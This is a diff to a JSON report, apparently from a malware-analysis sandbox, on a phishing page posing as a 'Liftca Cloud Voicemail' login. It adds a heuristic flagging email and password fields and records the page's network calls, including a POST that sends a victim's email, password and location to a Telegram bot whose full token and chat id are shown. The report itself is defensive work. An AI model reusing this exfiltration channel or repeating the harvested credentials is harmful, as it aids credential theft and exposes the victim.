@@ -5,6 +5,26 @@
     "sections": [
       {
         "auto_collapse": false,
+        "body": "HTML document has password / email / username input fields\n\t- <input> element 'floatingInput' contains the following phishing terms: 'email'\n\t- <input> element 'floatingPassword' contains the following phishing terms: 'password'\n\t- <input> element 'UserEmail' contains the following phishing terms: 'email'",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 25,
+          "score": 0,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "HTML document queries sensitive user data",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "Sample consists of a long single line of code",
         "body_config": {},
         "body_format": "TEXT",
@@ -348,7 +368,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\", \"request_body\": {\"chat_id\": \"-571909261\", \"text\": \"///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\\n\\nEmail: jami.reich@liftca.org\\nPassword : JsJ@w$==C00l!\\nIP Address : 127.0.0.1\\nRegion : Ottawa\\nCity : Ottawa\\nCountry : Canada\\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\\nFormat : 103,000=371,800\\nDate Filled : 10/16/2023\\nDateSent : 12/12/2022 8:01:03 a.m.\"}}]",
+        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\", \"request_body\": {\"chat_id\": \"-571909261\", \"text\": \"///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\\n\\nEmail: jami.reich@liftca.org\\nPassword : JsJ@w$==C00l!\\nIP Address : 127.0.0.1\\nRegion : Ottawa\\nCity : Ottawa\\nCountry : Canada\\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\\nFormat : 103,000=371,800\\nDate Filled : 11/8/2023\\nDateSent : 12/12/2022 8:01:03 a.m.\"}}]",
         "body_config": {
           "column_order": [
             "url",
@@ -556,6 +576,11 @@
       {
         "attack_ids": [],
         "heur_id": 10,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 25,
         "signatures": []
       }
     ],
